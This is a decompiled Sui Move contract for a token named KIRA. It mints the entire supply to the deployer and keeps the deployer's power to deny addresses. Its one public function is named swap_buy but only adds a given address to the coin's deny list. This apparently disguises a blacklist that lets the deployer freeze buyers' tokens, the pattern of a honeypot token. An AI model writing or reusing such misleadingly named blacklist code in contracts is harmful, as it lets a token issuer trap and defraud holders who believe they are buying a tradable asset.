module 0x48b76ab8f0bbf5bdbc49d2196db968b470e50229bfcdf6b3da5b70cc7ff8e34c::kira {
    struct KIRA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: KIRA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<KIRA>(arg0, 9, b"KIRA", b"Kira powered by Infera", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPzhrPYs2WhjcLqeb2XaL7C6Nf4aSDijogCJWyauWwVCA"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<KIRA>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<KIRA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<KIRA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<KIRA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KIRA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<KIRA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

